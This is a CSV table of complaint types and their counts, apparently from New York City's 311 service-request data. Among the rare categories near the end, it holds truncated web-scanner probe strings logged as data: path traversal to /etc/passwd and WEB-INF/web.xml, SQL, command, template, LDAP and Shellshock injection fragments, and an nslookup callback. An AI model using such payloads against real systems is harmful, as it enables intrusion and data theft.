Complaint Type,Count
Noise - Residential,3743884
Illegal Parking,2923364
HEAT/HOT WATER,2479310
Blocked Driveway,1715595
Noise - Street/Sidewalk,1338040
Street Condition,1321193
Street Light Condition,1164922
Request Large Bulky Item Collection,1073753
PLUMBING,998703
UNSANITARY CONDITION,957583
Water System,950162
HEATING,887869
Noise,735153
General Construction/Plumbing,687580
Noise - Commercial,654989
Traffic Signal Condition,636417
PAINT/PLASTER,618141
Noise - Vehicle,552882
Sewer,511713
GENERAL CONSTRUCTION,500813
Damaged Tree,477994
Rodent,466215
Derelict Vehicles,442475
ELECTRIC,437028
Dirty Conditions,417001
DOOR/WINDOW,407443
Sanitation Condition,383019
WATER LEAK,382648
Sidewalk Condition,376780
Building/Use,365966
PAINT - PLASTER,361227
Missed Collection (All Materials),344423
Abandoned Vehicle,317327
Literature Request,311162
Homeless Person Assistance,298017
Consumer Complaint,291801
GENERAL,290756
NONCONST,260890
FLOORING/STAIRS,255983
New Tree Request,247905
Graffiti,243869
Overgrown Tree/Branches,242202
Non-Emergency Police Matter,237962
Maintenance or Facility,217618
APPLIANCE,212113
Derelict Vehicle,207814
Taxi Complaint,199257
Elevator,193093
Missed Collection,183641
Dirty Condition,173355
Broken Muni Meter,172119
Noise - Helicopter,166904
Encampment,152753
Food Establishment,138994
For Hire Vehicle Complaint,138767
Root/Sewer/Sidewalk Condition,138186
Air Quality,125128
Lead,123219
Illegal Dumping,115725
Benefit Card Replacement,113957
DOF Property - Reduction Issue,108501
SAFETY,105980
Illegal Fireworks,104817
Street Sign - Damaged,99530
Dead/Dying Tree,92158
Snow,88108
Electronics Waste Appointment,87962
SCRIE,87627
Indoor Air Quality,77666
Noise - Park,77489
Broken Parking Meter,76648
Curb Condition,76185
Other Enforcement,74101
Traffic,73017
DOF Parking - Payment Issue,72499
Street Sign - Missing,71178
Drug Activity,70303
Plumbing,67681
NonCompliance with Phased Reopening,66317
DOF Property - Owner Issue,63830
DOF Property - Request Copy,61184
Highway Condition,60332
Special Projects Inspection Team (SPIT),58934
Emergency Response Team (ERT),58614
Water Conservation,57999
Dead Tree,57498
Obstruction,54388
DOF Property - Payment Issue,53716
HPD Literature Request,52831
Animal Abuse,52178
Housing - Low Income Senior,51517
Electrical,47018
Vending,46600
Illegal Tree Damage,46309
Animal-Abuse,44795
Violation of Park Rules,43728
Vendor Enforcement,43270
Food Poisoning,43236
Street Sign - Dangling,42788
DHS Advantage - Tenant,40930
Animal in a Park,40743
Residential Disposal Complaint,38232
Homeless Encampment,38208
Panhandling,38059
Lost Property,37560
Hazardous Materials,37455
Smoking,35963
Dead Animal,34562
Boilers,34133
Unsanitary Animal Pvt Property,32688
Litter Basket / Request,31650
Drinking,31383
Construction Safety Enforcement,31240
DHS Advantage -Landlord/Broker,30695
Construction,28311
Standing Water,28268
Street Sweeping Complaint,27860
Asbestos,27228
Outdoor Dining,26685
Electronics Waste,26491
DCA / DOH New License Application Request,26243
Vacant Lot,25452
School Maintenance,24721
Real Time Enforcement,23911
Mobile Food Vendor,23260
DOF Property - Update Account,21605
BEST/Site Safety,21557
Water Quality,21543
Snow or Ice,19320
Bus Stop Shelter Complaint,18890
Bike/Roller/Skate Chronic,18689
Industrial Waste,18352
Housing Options,18080
Noise - House of Worship,17009
Non-Residential Heat,16804
Overflowing Litter Baskets,16629
Derelict Bicycle,16306
Noise Survey,16303
Miscellaneous Categories,15614
Taxi Report,15585
Homeless Street Condition,15583
ELEVATOR,15207
Unleashed Dog,14480
Traffic/Illegal Parking,14047
Indoor Sewage,13338
Investigations and Discipline (IAD),12898
Illegal Posting,12566
Litter Basket Request,12084
OUTSIDE BUILDING,11854
Unsanitary Pigeon Condition,11779
Sanitation Worker or Vehicle Complaint,10436
DOF Parking - Request Status,10330
Urinating in Public,10015
Day Care,9837
Sweeping/Missed,9531
DOF Parking - Request Copy,9481
Commercial Disposal Complaint,9413
Recycling Enforcement,9314
DPR Internal,9294
OEM Literature Request,8746
Borough Office,8077
Vaccine Mandate Non-Compliance,7399
COVID-19 Non-essential Construction,7322
Building Marshals office,7116
Abandoned Bike,7059
DOF Parking - Tax Exemption,6953
Bridge Condition,6818
Unsanitary Condition,6763
Ferry Inquiry,6738
Public Payphone Complaint,6520
Lot Condition,6440
Sustainability Enforcement,6415
Dumpster Complaint,6196
Taxi Compliment,6141
Disorderly Youth,6140
Elder Abuse,6033
Sweeping/Missed-Inadequate,5913
CONSTRUCTION,5078
Illegal Animal Kept as Pet,5016
Mold,4938
Litter Basket Complaint,4937
Mosquitoes,4884
Construction Lead Dust,4816
For Hire Vehicle Report,4457
Smoking or Vaping,4448
Found Property,4081
DRIE,4023
Harboring Bees/Wasps,3861
Home Delivered Meal - Missed Delivery,3799
Ferry Complaint,3778
Mass Gathering Complaint,3652
Cranes and Derricks,3614
Posting Advertisement,3611
DOF Property - RPIE Issue,3517
Home Repair,3408
Scaffold Safety,3385
Adopt-A-Basket,3265
Bus Stop Shelter Placement,3244
Plant,3174
Senior Center Complaint,3113
Water Leak,3078
Storm,3005
Window Guard,2833
Sewer Maintenance,2813
Snow Removal,2804
Beach/Pool/Sauna Complaint,2749
Drinking Water,2638
Wood Pile Remaining,2637
Sweeping/Inadequate,2627
Alzheimer's Care,2611
City Vehicle Placard Complaint,2393
Collection Truck Noise,2264
Bike Rack Condition,2189
Paint/Plaster,2187
Facades,2162
Question,2162
Uprooted Stump,2135
Private or Charter School Reopening,2101
Poison Ivy,2063
DOF Property - Property Value,2010
DOF Parking - DMV Clearance,1991
Request Xmas Tree Collection,1986
OEM Disabled Vehicle,1916
Tattooing,1906
Heat/Hot Water,1814
Face Covering Violation,1799
General,1798
HEAP Assistance,1687
Highway Sign - Damaged,1613
Green Taxi Complaint,1566
LinkNYC,1496
Quality of Life,1495
E-Scooter,1465
Safety,1317
Utility Program,1301
Executive Inspections,1289
Unsanitary Animal Facility,1289
Forms,1261
Door/Window,1258
Pet Shop,1258
DHS Advantage - Third Party,1242
DOF Property - City Rebate,1200
Forensic Engineering,1167
Weatherization,1157
Animal Facility - No Permit,1126
Special Natural Area District (SNAD),1062
Municipal Parking Facility,1038
Illegal Animal Sold,936
DEP Street Condition,920
Home Delivered Meal Complaint,897
Seasonal Collection,790
Highway Sign - Missing,778
Stalled Sites,759
Advocate-Personal Exemptions,752
AHV Inspection Unit,727
Flooring/Stairs,695
Public Toilet,630
Appliance,563
Eviction,525
FATF,517
DOF Parking - Address Update,489
Advocate-Prop Refunds/Credits,485
Ferry Permit,433
Teaching/Learning/Instruction,420
Highway Sign - Dangling,419
Water Maintenance,407
Discipline and Suspension,385
Parking Card,383
Taxpayer Advocate Inquiry,351
Special Operations,325
Summer Camp,324
Incorrect Data,320
Lifeguard,290
Electric,290
Bereavement Support Group,282
Advocate - Other,281
Squeegee,272
Recycling Basket Complaint,265
Bike Rack,265
X-Ray Machine/Equipment,261
Home Care Provider Complaint,257
Case Management Agency Complaint,254
ATF,248
Private School Vaccine Mandate Non-Compliance,219
Cooling Tower,204
Overflowing Recycling Baskets,196
Calorie Labeling,196
Institution Disposal Complaint,196
Comments,194
Bottled Water,193
Registration and Transfers,190
Transportation Provider Complaint,183
FCST,183
Legal Services Provider Complaint,176
Dept of Investigations,170
Green Taxi Report,166
Radioactive Material,164
Health,164
Building Drinking Water Tank,157
DHS Income Savings Requirement,154
Water Drainage,136
Tunnel Condition,129
Peeling Paint,129
Dispatched Taxi Complaint,91
Foam Ban Enforcement,89
Research Questions,89
Unstable Building,85
Advocate-Co-opCondo Abatement,84
Building Condition,84
Unlicensed Dog,77
Taxi Licensee Complaint,75
FHV Licensee Complaint,73
DOR Literature Request,67
Parent Leadership,64
Tanning,54
Retailer Complaint,53
Bench,51
Boiler,41
Advocate-Property Value,41
Single Occupancy Bathroom,40
ZTESTINT,37
Tobacco or Non-Tobacco Sale,36
Trans Fat,34
Transfer Station Complaint,32
DEP Highway Condition,29
No Child Left Behind,23
SRDE,22
Internal Code,22
Oil or Gas Spill,22
Interior Demo,21
NORC Complaint,20
SNW,19
Advocate-Commercial Exemptions,19
DEP Sidewalk Condition,19
Advocate-SCRIE/DRIE,18
Wayfinding,17
Special Enforcement,17
STRUCTURAL,16
Fire Alarm - Reinspection,16
Portable Toilet,13
Advocate - Lien,13
DSNY Internal,12
Public Assembly,11
Advocate - RPIE,10
Fire Alarm - New System,9
Advocate-Prop Class Incorrect,9
AGENCY,9
Rangehood,9
Advocate-Business Tax,8
VACANT APARTMENT,8
Outside Building,8
Employee Behavior,7
Standpipe - Mechanical,6
Leaning Bar,6
Building Marshal's Office,6
DSNY Spillage,6
DOF Property - State Rebate,5
Select Message Type...,5
Advocate-UBT,5
General Question,5
DOB Posted Notice or Order,5
SRGOVG,4
../../../../../../../../../...,4
Hazardous Material,4
..\..\..\..\..\..\..\..\..\...,4
Dispatched Taxi Compliment,4
Fire Alarm - Modification,4
Sprinkler - Mechanical,3
Misc. Comments../../../../....,3
Advocate - Levy,2
Homebound Evacuation 4,2
ZSYSTEST,2
MOLD,2
Gas Station Discharge Lines,2
Hazmat Storage/Use,2
Trapping Pigeon,2
Facade Insp Safety Pgm,2
Misc. Comments..\..\..\..\....,2
file:///etc/passwd,2
MSOTHER,1
Misc. Comments&gt;  BCC:bl0...,1
/etc/passwd,1
Misc. Comments&quot;|ping -...,1
/./validate_form.php,1
Misc. Comments&amp;ping -n ...,1
Misc. Commentseowljujfh8,1
Misc. Comments' and (select...,1
Misc. Comments'(select*from...,1
Misc. Comments'+(select loa...,1
Misc. Comments';declare @q ...,1
../../WEB-INF/web.xml,1
Misc. Comments{${sleep(20)}},1
Misc. Comments}}t2v95'/&quo...,1
c:\windows\win.ini Misc. Co...,1
Misc. Comments'+(function()...,1
Misc. Comments'+(select*fro...,1
Asbestos/Garbage Nuisance,1
LEAD,1
Illegal Animal - Sold/Kept,1
../WEB-INF/web.xml,1
qfix4${695*589}lixaf,1
../../../../WEB-INF/web.xml,1
...\.\...\.\...\.\...\.\......,1
(select extractvalue(xmltyp...,1
`sleep 11`,1
Misc. Comments|ping -c 21 1...,1
Misc. Comments|echo 3p7wexz...,1
Misc. Comments69075347' or ...,1
Misc. Comments);declare @q ...,1
Misc. Comments'||(select ex...,1
"Misc. Comments',0)waitfor d...",1
Misc. Comments');declare @q...,1
Misc. Comments' and '7835'=...,1
Misc. Comments',1
Misc. Comments  BCC:a5glxzf...,1
1430*4963,1
...\./...\./...\./...\./......,1
.../....///.../....///.../....,1
&lt;vlv xmlns=&quot;http://...,1
%{4761*8506},1
%c0%ae/%c0%ae/%c0%ae/%c0%ae...,1
%2fetc%2fpasswd,1
Injured Wildlife,1
&lt;odb xmlns:xi=&quot;http...,1
&quot;--&gt;'--&gt;`--&gt;&...,1
Public Assembly - Temporary,1
Meals Home Delivery Required,1
*)(objectClass=*,1
.../...//.../...//.../...//...,1
..././..././..././..././......,1
Open Flame Permit,1
%c0%ae/WEB-INF/web.xml,1
DOF Literature Request,1
Misc. Comments'.sleep(20).',1
() { _; } &gt;_,1
(select load_file('\\\\615h...,1
../../WEB-INF/web.xml;x=,1
@(9313*3464),1
Misc. Comments&amp;nslookup...,1
Misc. Comments'&quot;`0&amp...,1
Misc. Comments88909845' or ...,1
Misc. Comments' and '1618'=...,1
Misc. Commentso0w3r%&gt;xb6...,1
http://g7orz5h9iu2sh6z332rj...,1
nslookup -q=cname nneyfcxgy...,1
yw97y0gi2s,1
{!xmlparser v='&lt;!DOCTYPE...,1
%c0%ae/%c0%ae/%c0%ae/WEB-IN...,1
%{(#dm=@ognl.OgnlContext@DE...,1
%2e%2e%2f%2e%2e%2f%2e%2e%2f...,1
Misc. Comments' and 7702=77...,1
Misc. Comments')waitfor del...,1
Change Collection Schedule,1
Unspecified,1
Misc. Comments'+sleep(20.to...,1
Misc. Comments'|echo y9v6fc...,1
Misc. Comments'|ping -c 21 ...,1
"Misc. Comments,(select*from...",1
Misc. Comments47876391' or ...,1
Misc. Comments52038737' or ...,1
Request Changes - A.S.P.,1
a'a\'b&quot;c&gt;?&gt;%}}%%...,1
bcd9&lt;!--esi--&gt;1ggp&lt...,1
eval(compile('for x in rang...,1
g0oii1s4s5)(objectClass=*,1
../WEB-INF/web.xml;x=,1
Misc. Comments&amp;echo xjd...,1
Advocate-Foreclosure,1
.../Misc. Comments,1
Misc. Comments'+eval(compil...,1
Misc. Comments' waitfor del...,1
Misc. Comments' and 6049=60...,1
Misc. Comments&quot;,1
Misc. Comments%}dt2pq'/&quo...,1
../../../WEB-INF/web.xml;x=,1
.../.\.../.\.../.\.../.\......,1
Fire Alarm - Replacement,1
*)(!(objectClass=*),1
() { :;}; /bin/sleep 11,1
idexf3mrb7)(!(objectClass=*),1
%2e%2e%5c%2e%2e%5c%2e%2e%5c...,1
${3804*3137},1
$(sleep 11),1
Misc. Comments;declare @q v...,1
Misc. Comments]]&gt;&gt;&lt;,1
Misc. Comments|nslookup -q=...,1
\windows\win.ini,1
c:\windows\win.ini,1
file:///c:/windows/win.ini,1
hcvn1{{687*375}}gji51,1
kawn''lcgv,1
DEP Bridge Condition,1
Misc. Comments|ping -n 21 1...,1
SG-99,1
%E5%98%8A%E5%98%8DX-Injecti...,1
%c0%ae/%c0%ae/WEB-INF/web.xml,1
() { :;}; /bin/sleep 0,1
../../../WEB-INF/web.xml,1
./validate_form.php,1
266dyrgvhg1egsyp2oq57axbm2s...,1
Misc. Comments&quot;|echo 2...,1
